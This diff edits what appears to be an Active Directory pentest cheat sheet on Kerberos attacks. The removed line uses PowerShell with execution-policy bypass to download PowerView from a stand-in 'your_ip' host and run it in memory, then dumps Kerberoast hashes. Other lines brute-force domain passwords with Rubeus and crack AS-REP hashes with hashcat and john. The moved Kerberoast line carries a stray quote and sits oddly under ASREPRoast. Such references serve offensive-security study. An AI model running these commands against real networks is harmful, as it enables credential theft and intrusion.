@@ -15,8 +15,6 @@ With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 
-#Powerview.ps1 and HashCat
-powershell.exe -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://your_ip/powerview.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt"
 ```
 
 ## ASREPRoast
@@ -38,6 +36,9 @@ With [Rubeus](https://github.com/GhostPack/Rubeus):
 
 Cracking with dictionary of passwords:
 ```shell
+#Powerview.ps1 and HashCat
+Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt"
+
 hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
 
 john --wordlist=<passwords_file> <AS_REP_responses_file>
